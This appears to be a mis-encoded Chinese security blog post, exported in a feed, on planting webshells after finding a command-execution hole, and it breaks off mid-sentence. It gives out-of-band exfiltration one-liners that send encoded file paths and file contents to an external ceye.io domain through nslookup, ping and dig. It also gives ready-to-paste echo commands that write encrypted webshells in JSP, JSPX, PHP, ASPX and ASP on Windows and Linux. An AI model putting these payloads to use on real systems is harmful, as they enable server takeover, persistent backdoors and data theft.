src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt> è¿˜åœ¨ç­‰ä»€ä¹ˆï¼Ÿèµ¶ç´§ç‚¹å‡»ä¸‹æ–¹åç‰‡å…³æ³¨å­¦ä¹ å§ï¼<img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img src="http://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6YLhRjHMxGMsH55CSVdlMC0XEwtoAQI06hia8rd371BcDnQ8bfRmP4YqA/0?wx_fmt=png" alt></p><p><strong>æ½‡æ¹˜ä¿¡å®‰</strong></p><p>ä¸€ä¸ªä¸ä¼šç¼–ç¨‹ã€æŒ–SRCã€ä»£ç å®¡è®¡çš„å®‰å…¨çˆ±å¥½è€…ï¼Œä¸»è¦åˆ†äº«ä¸€äº›å®‰å…¨ç»éªŒã€æ¸—é€æ€è·¯ã€å¥‡æ·«æŠ€å·§ä¸çŸ¥è¯†æ€»ç»“ã€‚</p><p>110ç¯‡åŸåˆ›å†…å®¹</p><p>å…¬ä¼—å·</p><hr><p><strong>æ¨ è é˜… è¯»</strong></p><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247491360&amp;idx=1&amp;sn=e4c3d356b45d7fe821dc2b645f30a595&amp;chksm=cfa6bb33f8d132259884026238db7b79f33da3f3fff2f90a87e4a447118a1be8c4e948031d8f&amp;scene=21 textvalue=" target="_blank" rel="noopener"><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOec0rlHvusMpuZ14HCT4dZn9ZdY1H6uNgSDcvJmovZibZVy4FV2kEib6nJ9SASN1b4Es56KdPsHWibKg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></a></p><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247486961&amp;idx=1&amp;sn=d02db4cfe2bdf3027415c76d17375f50&amp;chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&amp;scene=21 data-itemshowtype=" target="_blank" rel="noopener"><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></a></p><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247486327&amp;idx=1&amp;sn=71fc57dc96c7e3b1806993ad0a12794a&amp;chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&amp;scene=21 data-itemshowtype=" target="_blank" rel="noopener"><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></a></p><hr><p><strong>æ¬¢ è¿ ç§ ä¸‹ éªš æ‰°</strong></p><p><img src="/s/data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt></p><p>var first_sceen__time = (+new Date()); if (â€œâ€ == 1 &amp;&amp; document.getElementById(â€˜js_contentâ€™)) { document.getElementById(â€˜js_contentâ€™).addEventListener(â€œselectstartâ€,function(e){ e.preventDefault(); }); }</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/11/10/RCE%E5%86%99shell%E6%80%BB%E7%BB%93/RCE%E5%86%99shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
      <url>/2021/11/10/RCE%E5%86%99shell%E6%80%BB%E7%BB%93/RCE%E5%86%99shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯æ¸—é€æµ‹è¯•ä¸­å¾ˆå¸¸è§çš„æ¼æ´ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æ”»é˜²æ¼”ç»ƒæˆ–è€…å®‰å…¨æµ‹è¯•ä¸­å¿«é€Ÿgetshellçš„ä¸€ç§é€”å¾„ï¼Œå½“ç„¶ï¼Œæœ‰æ—¶å‘ç°å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ°æˆåŠŸgetshellçš„è¿‡ç¨‹å¯èƒ½æ³¨å®šä¸ä¼šå¤ªè¿‡å®¹æ˜“ï¼Œå¦‚å¸¸è§çš„ä¸€äº›é—®é¢˜ï¼šç›®æ ‡æœºå™¨ä¸å‡ºç½‘ï¼Œæ‰§è¡Œå‘½ä»¤æ— å›æ˜¾ï¼Œç›²æ³¨æµªè´¹æ—¶é—´ï¼Œå†™shellå®¹å™¨è·¯å¾„æ‰¾ä¸åˆ°ï¼Œå†™shellå­—ç¬¦è½¬ä¹‰é”™è¯¯ï¼Œä¸Šä¼ shellæ–‡ä»¶è¢«æ€ã€ä¸‹è½½wgetç­‰å‘½ä»¤æ‰¾ä¸åˆ°ç­‰ç­‰ã€‚é‚£éƒ½æ˜¯ä¸€ä¸ªæ‚²ä¼¤çš„æ•…äº‹ã€‚è¿™ç¯‡æ–‡ç« æŠ€æœ¯å«é‡ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æˆ‘æƒ³åº”è¯¥èƒ½å¸®åŠ©ä¸å°‘äººã€‚</p><h2 id="å¯»æ‰¾webè·¯å¾„"><a href="#å¯»æ‰¾webè·¯å¾„" class="headerlink" title="å¯»æ‰¾webè·¯å¾„"></a>å¯»æ‰¾webè·¯å¾„</h2><p>æƒ³è¦å†™æ–‡ä»¶(webshell)ï¼Œé¦–å…ˆè¦æ‰¾åˆ°webå®¹å™¨çš„æ ¹ç›®å½•ï¼Œä¸‹é¢æ˜¯æ€»ç»“çš„ä¸€äº›å¯»æ‰¾webç›®å½•çš„æ–¹æ³•ã€‚</p><h3 id="1-æ–‡ä»¶æŸ¥æ‰¾æ³•"><a href="#1-æ–‡ä»¶æŸ¥æ‰¾æ³•" class="headerlink" title="1.æ–‡ä»¶æŸ¥æ‰¾æ³•"></a>1.æ–‡ä»¶æŸ¥æ‰¾æ³•</h3><p><strong>ï¼ˆaï¼‰Windows</strong></p><p>å¯¹äºWindowsæŸ¥æ‰¾æ–‡ä»¶æ–¹æ³•ï¼Œæˆ‘æ”¶é›†äº†ä¸‰ç§ï¼Œå…¶ä¸­å‰ä¸¤ç§å¯ä»¥æŒ‡å®šç›®å½•ï¼Œè€Œæœ€åä¸€ç§åˆ™æ˜¯ä»å½“å‰ç›®å½•æœç´¢æ–‡ä»¶ã€‚ä¸‰è€…éƒ½å¸¦æœ‰é€šé…ç¬¦ï¼Œä»¥ä¸‹æ˜¯æœç´¢æ–‡ä»¶åä¸­å¸¦æœ‰loginçš„æ–‡ä»¶ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r C: %i <span class="keyword">in</span> (login.*) <span class="keyword">do</span> @echo %i</span><br><span class="line">where /R C: login.*</span><br><span class="line">dir /s/a<span class="literal">-d</span>/b login.*</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆbï¼‰Linux</strong></p><p>å¯¹äºLinuxæŸ¥æ‰¾æ–‡ä»¶æ–¹æ³•,æˆ‘æ”¶é›†äº†ä¸¤ç§ï¼Œå…¶ä¸­findæ˜¯æˆ‘ä»¬æœ€å¸¸ä½¿ç”¨çš„ï¼Œlocateéœ€è¦æ›´æ–°æ•°æ®åº“ï¼Œä½¿ç”¨ç›¸å¯¹éº»çƒ¦ï¼Œéƒ¨åˆ†ç³»ç»Ÿå¯èƒ½ä¸ä¼šæºå¸¦æ­¤å‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name "index.php"</span><br><span class="line">find / -name login.php</span><br><span class="line">updatedb &amp;&amp; locate index.php</span><br></pre></td></tr></table></figure><h3 id="2-æºç æŸ¥æ‰¾æ³•"><a href="#2-æºç æŸ¥æ‰¾æ³•" class="headerlink" title="2.æºç æŸ¥æ‰¾æ³•"></a>2.æºç æŸ¥æ‰¾æ³•</h3><p><strong>ï¼ˆaï¼‰Windows</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /s /i /n /d:C:\ /c:&quot;123123&quot; *.txt</span><br></pre></td></tr></table></figure><p>å…¶ä¸­/d:æ˜¯æŒ‡å®šç›®å½•ï¼Œåœ¨windowsä¸­ä¸€èˆ¬ä¸ºæŒ‡å®šç›˜ç¬¦ï¼Œ/c:åˆ™æ˜¯æŒ‡å®šæ–‡ä»¶å†…å®¹ï¼Œæœ€åæŒ‡å®šçš„æ˜¯æ–‡ä»¶åå­—ã€‚</p><p><strong>ï¼ˆbï¼‰Linux</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;</span><br></pre></td></tr></table></figure><p>ç›¸ä¿¡linuxæˆ‘ä»¬éƒ½å¾ˆç†Ÿæ‚‰ï¼Œè¿™é‡Œä¸è¿‡å¤šè¯´æ˜ã€‚</p><h3 id="3-å¸¦å¤–æŸ¥æ‰¾"><a href="#3-å¸¦å¤–æŸ¥æ‰¾" class="headerlink" title="3.å¸¦å¤–æŸ¥æ‰¾"></a>3.å¸¦å¤–æŸ¥æ‰¾</h3><p>å¯¹äºä¸€äº›æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œï¼Œæˆ–è€…ç›²æ³¨æµªè´¹æ—¶é—´çš„æ´ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ååŠ©OOBã€‚</p><p><strong>ï¼ˆaï¼‰Windows</strong></p><p>åœ¨windowså½“ä¸­ï¼Œ%cd% ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œæˆ‘ä»¬é€šè¿‡echoå°†å½“å‰ç›®å½•å†™å…¥æ–‡æœ¬temp,ç„¶åé€šè¿‡certutilå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œbase64ç¼–ç ï¼Œå†è¿‡æ»¤certutilæºå¸¦çš„å­—ç¬¦ï¼Œå°†å®ƒèµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œæœ€åé€šè¿‡nslookupå¤–å¸¦å‡ºæ¥ï¼Œä»è€Œå®ç°è·å–å½“å‰ç›®å½•çš„ç›®çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;set /p ADDR=&lt;temp2&amp;&amp;nslookup %ADDR%.is1lv6.ceye.io</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¿™ä¸ªè¯­å¥ï¼Œä¸»è¦æ˜¯è¿‡æ»¤ä½œç”¨ã€‚æŠŠhelo.txtæ–‡ä»¶ä¸­çš„â€œ=â€è¿‡æ»¤å¹¶é‡æ–°è¾“å‡ºæ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=^= tokens=1,*&quot; %i in (helo.txt) do (echo %i&gt;&gt;text3.txt)</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆåœ¨ä¸Šé¢éœ€è¦è¿‡æ»¤=ï¼Œä¸»è¦æ˜¯å› ä¸ºåœ¨æ‰§è¡Œpingå‘½ä»¤çš„æ—¶å€™æ˜¯ä¸å…è®¸å¸¦=å·çš„ï¼Œç›¸è¾ƒäºnslookupï¼Œpingå‘½ä»¤æˆåŠŸç‡ç›¸å¯¹è¾ƒé«˜ï¼Œä½†å¦‚æœè·¯å¾„è¿‡é•¿ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¤±è´¥ã€‚å…·ä½“å¤šé•¿éœ€è¦å¤§å®¶è‡ªè¡Œè¯•éªŒã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;for /f &quot;delims=^= tokens=1,*&quot; %i in (temp2) do (echo %i&gt;&gt;temp3)&amp;&amp;set /p ADDR=&lt;temp3&amp;ping %ADDR%.is1lv6.ceye.io</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦å¤–å¸¦å¤šè¡Œå‘½ä»¤ï¼Œåˆ™éœ€è¦ä»¥ä¸‹è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where /R C: login.* &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&apos; &apos;,&apos;&apos;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&apos;.&apos;+$i+&apos;.is1lv6.ceye.io&apos;;$j += 1; nslookup $fin &#125;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆbï¼‰Linux</strong></p><p>åœ¨linuxä¸­pwdä¹Ÿæ˜¯æŸ¥çœ‹å½“å‰ç›®å½•çš„ï¼Œæˆ‘ä»¬é€šè¿‡tr -då°†æ¢è¡Œç¬¦å»æ‰å¹¶é€šè¿‡xxd -pså°†å€¼è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œè¿™æ ·æˆ‘ä»¬å³å¯å¤–å¸¦å‡ºè‡ªå·±æƒ³è¦çš„ä¸œè¥¿ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping pwd|tr -d &apos;\n&apos;|xxd -ps.is1lv6.ceye.io</span><br></pre></td></tr></table></figure><p>base64åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œä¸»è¦æ˜¯å¯¹å€¼è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åæ›¿æ¢æ‰â€œ=â€ï¼Œå³å¯æˆåŠŸå¤–å¸¦æ•°æ®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingpwd|base64|tr -d â€˜=â€™.is1lv6.ceye.io</span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰å¤šè¡Œæ•°æ®éœ€è¦å¤–å¸¦ï¼Œé‚£ä¹ˆè¯·è€ƒè™‘ä¸‹é¢çš„è¯­å¥ã€‚ï¼ˆå’Œå¤§ä½¬å­¦çš„ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var=11111 &amp;&amp; for b in $(find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;|xxd -p); do var=$((var+1)) &amp;&amp; dig $var.$b.is1lv6.ceye.io; done</span><br></pre></td></tr></table></figure><p>oobä¸»è¦å‚è€ƒä¸€ä½å¤§ä½¬æ–‡ç« ï¼Œä¼šåœ¨æ–‡æœ«åˆ—å‡ºã€‚</p><h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å†™shell"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å†™shell" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å†™shell"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å†™shell</h2><p>é€šè¿‡ä¸Šé¢çš„å‡ ç§æ–¹æ³•ï¼Œæ„Ÿè§‰æ‰¾ä¸ªç›®å½•ä¸åœ¨è¯ä¸‹ã€‚ï¼ˆå¦‚æœæ˜¯ç«™åº“åˆ†ç¦»ï¼Œå½“æˆ‘æ²¡è¯´ï¼‰<br>ä¸‹é¢æ€»ç»“çš„æ˜¯æ–‡ä»¶å†™å…¥æ–¹æ³•ã€‚</p><h3 id="1-ç›´æ¥å†™å…¥æ³•"><a href="#1-ç›´æ¥å†™å…¥æ³•" class="headerlink" title="1.ç›´æ¥å†™å…¥æ³•"></a>1.ç›´æ¥å†™å…¥æ³•</h3><p><strong>ï¼ˆaï¼‰Windows</strong></p><p>åœ¨windowsä¸»è¦çš„å†™å…¥æ–¹æ³•ï¼Œæˆ‘ä¸»è¦ç”¨ä»¥ä¸‹ä¸¤ç§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set /p=è¦å†™çš„å†…å®¹&lt;nul &gt; C:\11.txt</span><br><span class="line">echo è¦å†™çš„å†…å®¹ &gt; C:\11.txt</span><br></pre></td></tr></table></figure><p>åœ¨<strong>windowsä¸­ï¼Œæ‰¹å¤„ç†éœ€è¦è½¬ä¹‰å­—ç¬¦ä¸»è¦æœ‰ â€œ&amp;â€ï¼Œâ€œ|â€ï¼Œâ€œ&lt;â€ï¼Œâ€œ&gt;â€ç­‰ç­‰ï¼Œè½¬ä¹‰å­—ç¬¦ä¸ºâ€^â€</strong></p><p>ä¸‹é¢ä»¥echoä¸ºä¾‹ï¼Œå†™å…¥å†°èå„è„šæœ¬è¯­è¨€shellï¼Œ<strong>å…¶ä¸­éœ€è¦è½¬ä¹‰çš„ä¸œè¥¿ï¼Œæˆ‘å·²ç»å¸®å„ä½è¡¨å“¥è½¬è¿‡äº†ï¼Œæ‹¿æ¥ç›´æ¥ç”¨å³å¯ï¼š</strong></p><p><strong>ï¼ˆ1ï¼‰jsp</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if (request.getMethod().equals("POST"))&#123;String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%^&gt; &gt; 111.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰jspx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;^&gt;^&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/^&gt;^&lt;jsp:declaration^&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;^&lt;/jsp:declaration^&gt;^&lt;jsp:scriptlet^&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);^&lt;/jsp:scriptlet^&gt;^&lt;/jsp:root^&gt; &gt; 111.jspx</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&apos;k&apos;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&apos;openssl&apos;))^&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i^&lt;strlen($post);$i++) ^&#123;$post[$i] = $post[$i]^^$key[$i+1^&amp;15]; ^&#125;^&#125;else^&#123;$post=openssl_decrypt($post, &quot;AES128&quot;, $key);^&#125;$arr=explode(&apos;^|&apos;,$post);$func=$arr[0];$params=$arr[1];class C^&#123;public function __invoke($p) ^&#123;eval($p.&quot;&quot;);^&#125;^&#125;@call_user_func(new C(),$params);?^&gt; &gt; 111.php</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ4ï¼‰java9 jsp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;; session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%^&gt; &gt; 111.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ5ï¼‰aspx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@ Page Language=&quot;C#&quot; %^&gt;^&lt;%@Import Namespace=&quot;System.Reflection&quot;%^&gt;^&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;); byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%^&gt; &gt; 111.aspx</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ6ï¼‰asp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;% &gt;&gt; 111.asp&amp;echo Response.CharSet = &quot;UTF-8&quot; &gt;&gt; 111.asp&amp;echo k=&quot;e45e329feb5d925b&quot; &gt;&gt; 111.asp&amp;echo Session(&quot;k&quot;)=k &gt;&gt; 111.asp&amp;echo size=Request.TotalBytes &gt;&gt; 111.asp&amp;echo content=Request.BinaryRead(size) &gt;&gt; 111.asp&amp;echo For i=1 To size &gt;&gt; 111.asp&amp;echo result=result^&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))) &gt;&gt; 111.asp&amp;echo Next &gt;&gt; 111.asp&amp;echo execute(result) &gt;&gt; 111.asp&amp;echo %^&gt; &gt;&gt; 111.asp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆbï¼‰Linux</strong></p><p>åœ¨Linuxä¸­ï¼Œéœ€è¦è½¬ä¹‰å­—ç¬¦ä¸»è¦æ˜¯ å•å¼•å· æˆ–è€…åŒå¼•å· å¯¹äºå•å¼•å·ï¼Œæˆ‘ä»¬å°†å…¶æ›¿æ¢ä¸º\47å³å¯ã€‚</p><p><strong>ï¼ˆ1ï¼‰jsp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&apos; &gt; 111.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰jspx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;&apos; &gt; 111.jspx</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &apos;&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[\047k\047]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(\047openssl\047))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i++) &#123;$post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125;&#125;else&#123;$post=openssl_decrypt($post, &quot;AES128&quot;, $key);&#125;$arr=explode(\047|\047,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt; &apos; &gt; 111.php</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ4ï¼‰aspx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;); byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;&apos; &gt; 111.aspx</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ5ï¼‰asp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &apos;&lt;%\nResponse.CharSet = &quot;UTF-8&quot; \nk=&quot;e45e329feb5d925b&quot; \nSession(&quot;k&quot;)=k\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\n%&gt;&apos; &gt; 111.asp</span><br></pre></td></tr></table></figure><h3 id="2-è½¬æ¢æ³•"><a href="#2-è½¬æ¢æ³•" class="headerlink" title="2.è½¬æ¢æ³•"></a>2.è½¬æ¢æ³•</h3><p>è½¬æ¢æ³•ï¼Œæ‡‚å¾—éƒ½æ‡‚ã€‚</p><p>é—®é¢˜æ¥äº† 